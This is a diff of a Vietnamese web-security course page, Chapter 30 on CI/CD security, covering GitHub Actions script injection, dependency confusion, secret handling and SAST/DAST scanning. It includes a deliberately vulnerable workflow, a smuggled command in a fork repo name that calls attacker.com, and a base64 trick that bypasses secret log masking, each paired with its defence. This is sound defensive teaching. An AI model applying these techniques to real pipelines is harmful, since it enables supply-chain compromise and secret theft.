@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Chương 30: CI/CD Security — Hieu Nguyen</title>
-  <meta name="description" content="Pipeline injection, dependency confusion, secrets CI, SAST DAST SCA.">
+  <meta name="description" content="Chương 30: CI/CD Security — Web Security notes.">
   <link rel="icon" href="../../../favicon.svg" type="image/svg+xml">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Outfit:wght@400;500;600;700;800&display=swap" rel="stylesheet">
@@ -40,52 +40,136 @@
         <span>›</span>
         <span>30. CI/CD</span>
       </div>
-      <h1>Chương 30: CI/CD Security</h1>
-      <p class="lede">Pipeline là production. Ai push YAML là ai ship code lên cluster.</p>
-      <div class="docs-meta">
-        <span><strong>Tác giả:</strong> Hieu Nguyen (Ryan)</span>
-        <span><strong>Phần:</strong> VIII — DevOps</span>
-        <span><strong>Cập nhật:</strong> Aug 2026</span>
-      </div>
-      <h2 id="khai-niem">Khái niệm</h2>
-<p>CI/CD đọc PR, secret cloud, deploy. Lỗ pipeline = lỗ prod.</p>
-<h2 id="rui-ro">Rủi ro</h2>
-<ul>
-        <li>Script inj từ tên nhánh / PR untrusted (script injection).</li>
-        <li>Dependency confusion: package nội bộ bị cướp tên public.</li>
-        <li>Secret trong log / variable unmasked.</li>
-        <li>Supply chain: action/tag GitHub không pin hash.</li>
-        <li>Self-hosted runner không isolate.</li>
-      </ul>
-<h2 id="scan">SAST / DAST / SCA</h2>
-<p>SCA sớm (Trivy/Snyk). SAST PR. DAST staging. Fail build mức critical có SLA.</p>
-<h2 id="phong">Phòng chống</h2>
-<ul>
-        <li>Least privilege OIDC to cloud, không long-lived key.</li>
-        <li>Pin actions SHA.</li>
-        <li>Tách privileged pipeline.</li>
-        <li>Signed artifact + admission verify.</li>
-      </ul>
-<h2 id="tom-tat">Tóm tắt</h2>
-<ul>
-        <li>Pin dependencies/actions.</li>
-        <li>OIDC ngắn hạn.</li>
-        <li>Không secret log.</li>
-        <li>Gate scan.</li>
-      </ul>
-<h2 id="on-tap">Câu hỏi ôn tập</h2>
-<ol>
-        <li>Dependency confusion?</li>
-        <li>Vì sao pin SHA action?</li>
-        <li>OIDC hơn static key?</li>
-        <li>DAST chạy đâu?</li>
-        <li>PR từ fork chạy privileged job sai chỗ nào?</li>
-      </ol>
+      <div id="top"></div>
+<header><h1>Chương 30: CI/CD Security</h1></header>
+<h2 id="khái-niệm">Khái niệm</h2>
+<p>CI/CD pipelines là một trong những attack surfaces quan trọng nhất trong modern DevOps. Compromise pipeline = compromise toàn bộ software supply chain.</p>
+<hr>
+<h2 id="pipeline-injection">Pipeline Injection</h2>
+<pre><code class="language-yaml"># GitHub Actions — Vulnerable
+name: CI
 
-      <div class="docs-tags">
-        <span class="docs-tag">cicd</span>
-        <span class="docs-tag">supply-chain</span>
-      </div>
+on:
+  pull_request:
+    types: [opened, synchronize]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Greet contributor
+        run: echo &quot;Hello ${{ github.event.pull_request.head.repo.full_name }}&quot;
+        # ← Nếu fork repo name chứa shell injection payload!
+        
+      # Attack: Fork repo với name: &quot;user/repo$(curl attacker.com)&quot;
+      # → Bash execute curl command trong pipeline context
+</code></pre>
+<p><strong>Phòng chống:</strong></p>
+<pre><code class="language-yaml"># ĐÚNG: Set env variable trước, reference qua env
+- name: Greet contributor
+  env:
+    REPO_NAME: ${{ github.event.pull_request.head.repo.full_name }}
+  run: echo &quot;Hello $REPO_NAME&quot;
+  # $REPO_NAME passed as string, không executed as shell
+</code></pre>
+<hr>
+<h2 id="dependency-confusion">Dependency Confusion</h2>
+<pre><code class="language-text">Public package: lodash (tên)
+Internal package: company-utils (tên) → chỉ có trên internal registry
+
+Attack:
+1. Hacker publish package tên &quot;company-utils&quot; lên npmjs.com với version cao hơn
+2. npm/pip check public registry trước (hoặc cùng lúc)
+3. Download malicious &quot;company-utils&quot; v99.0.0 thay vì internal v1.0.0
+4. Malicious package chạy postinstall script → exfiltrate secrets
+</code></pre>
+<p><strong>Phòng chống:</strong></p>
+<pre><code class="language-text">1. Dùng scoped packages: @company/utils (npm)
+2. Configure package manager chỉ dùng internal registry
+3. Verify package checksums (package-lock.json, pip hash)
+4. Block outbound đến public registry từ build environment
+</code></pre>
+<hr>
+<h2 id="secrets-trong-cicd">Secrets trong CI/CD</h2>
+<pre><code class="language-yaml"># SAI: Hardcode trong pipeline
+- name: Deploy
+  run: |
+    docker login -u admin -p SuperSecret123
+    
+# ĐÚNG: Dùng secrets
+- name: Deploy
+  env:
+    DOCKER_PASSWORD: ${{ secrets.DOCKER_PASSWORD }}
+  run: |
+    echo &quot;$DOCKER_PASSWORD&quot; | docker login -u admin --password-stdin
+    
+# Log masking: GitHub tự mask secrets trong logs
+# Nhưng base64 encode sẽ bypass masking!
+# - name: Debug (NGUY HIỂM!)
+#   run: echo &quot;${{ secrets.MY_SECRET }}&quot; | base64
+</code></pre>
+<hr>
+<h2 id="supply-chain-attacks">Supply Chain Attacks</h2>
+<pre><code class="language-text">SolarWinds style attack:
+1. Compromise upstream dependency
+2. Inject malicious code vào legitimate package
+3. Downstream consumers install without knowing
+
+Phòng chống:
+- Pin exact versions (không dùng @latest hoặc ~1.0)
+- Verify checksums/hashes
+- SBOM (Software Bill of Materials)
+- Dependency scanning: Snyk, Dependabot, Trivy
+- Private mirror cho dependencies
+</code></pre>
+<hr>
+<h2 id="sast-và-dast-trong-pipeline">SAST và DAST trong Pipeline</h2>
+<pre><code class="language-yaml"># GitHub Actions với SAST
+name: Security
+
+on: [push, pull_request]
+
+jobs:
+  sast:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      
+      - name: SAST với Semgrep
+        run: |
+          pip install semgrep
+          semgrep --config=p/owasp-top-ten \
+                  --config=p/sql-injection \
+                  --config=p/command-injection \
+                  src/ \
+                  --output report.json \
+                  --json
+          
+      - name: Dependency Scan với Safety
+        run: |
+          pip install safety
+          safety check -r requirements.txt
+          
+  dast:
+    needs: [build, deploy-staging]
+    runs-on: ubuntu-latest
+    steps:
+      - name: DAST với ZAP
+        run: |
+          docker run owasp/zap2docker-stable \
+            zap-baseline.py \
+            -t https://staging.example.com \
+            -r zap-report.html
+</code></pre>
+<hr>
+<h2 id="tóm-tắt">Tóm tắt</h2>
+<ul>
+<li>Pipeline injection: user-controlled input chạy trong pipeline context.</li>
+<li>Dependency confusion: public package hijack tên internal package.</li>
+<li>Secrets: dùng CI/CD secret store, không hardcode, cẩn thận với encoding.</li>
+<li>Supply chain: pin versions, verify hashes, scan dependencies.</li>
+<li>SAST chạy trong PR check; DAST chạy sau deploy to staging.</li>
+</ul>
       <div class="docs-pager">
         <a href="../29/">Previous · 29. Kubernetes</a>
         <a href="../31/">Next · 31. Secrets</a>
@@ -94,12 +178,13 @@
     <aside class="docs-toc">
       <div class="docs-toc-title">On this page</div>
       <nav>
-        <a href="#khai-niem">Khái niệm</a>
-        <a href="#rui-ro">Rủi ro</a>
-        <a href="#scan">SAST / DAST / SCA</a>
-        <a href="#phong">Phòng chống</a>
-        <a href="#tom-tat">Tóm tắt</a>
-        <a href="#on-tap">Câu hỏi ôn tập</a>
+        <a href="#khái-niệm">Khái niệm</a>
+        <a href="#pipeline-injection">Pipeline Injection</a>
+        <a href="#dependency-confusion">Dependency Confusion</a>
+        <a href="#secrets-trong-cicd">Secrets trong CI/CD</a>
+        <a href="#supply-chain-attacks">Supply Chain Attacks</a>
+        <a href="#sast-và-dast-trong-pipeline">SAST và DAST trong Pipeline</a>
+        <a href="#tóm-tắt">Tóm tắt</a>
       </nav>
     </aside>
   </div>
